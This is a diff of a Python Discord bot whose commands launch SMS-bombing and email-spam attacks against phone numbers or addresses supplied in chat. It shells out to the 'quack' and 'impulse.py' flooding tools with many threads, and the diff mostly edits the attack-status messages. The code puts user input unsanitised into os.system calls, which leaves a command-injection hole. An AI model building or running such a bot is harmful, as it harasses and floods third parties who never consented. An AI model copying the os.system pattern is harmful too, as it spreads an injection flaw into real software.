@@ -10,7 +10,7 @@ bot = commands.Bot(command_prefix='*', description="Test bot")
 # Event
 @bot.event
 async def on_ready():
-   await bot.change_presence(activity=discord.Streaming(name="*info", url="https://twitch.tv/monda"))
+   await bot.change_presence(activity=discord.Streaming(name="*info"))
    print("\033[4;35m"+"bot on")
 
 
@@ -33,18 +33,18 @@ async def sms(ctx,arg):
 		await ctx.send(embed=embed10)
 		return
 	#print(validate[0])
-	embed = discord.Embed(title ="the attack takes between takes 2 minutes", color=0x00ff00, timestamp=datetime.datetime.utcnow())
+	embed = discord.Embed(title ="the sms attack takes between takes 2 minutes", color=0x00ff00, timestamp=datetime.datetime.utcnow())
 	await ctx.send(embed=embed)
 	os.system(f"cd quack ; python3 quack --tool SMS --target  {validate[0]} --threads 60 --timeout 90")	
-	embed2 = discord.Embed(title ="attack completed! :skull:" ,color=0x00ff00,timestamp=datetime.datetime.utcnow())
+	embed2 = discord.Embed(title ="sms attack completed! :skull:" ,color=0x00ff00,timestamp=datetime.datetime.utcnow())
 	await ctx.send(embed=embed2)
 
 @bot.command()
 async def email(ctx,arg):
-    embed4 = discord.Embed(title ="spam sent! takes 1 minute and 30 seconds", color=000000)
+    embed4 = discord.Embed(title ="Email spam sent! takes 1 minute and 30 seconds", color=000000)
     await ctx.send(embed=embed4)
     os.system(f"python3 impulse.py --method EMAIL --time 90 --target {arg}")
-    embed5 = discord.Embed(title ="atack completed!", color=0x00ff00, timestamp=datetime.datetime.utcnow())
+    embed5 = discord.Embed(title ="Email atack completed!", color=0x00ff00, timestamp=datetime.datetime.utcnow())
     await ctx.send(embed=embed5)
 
 
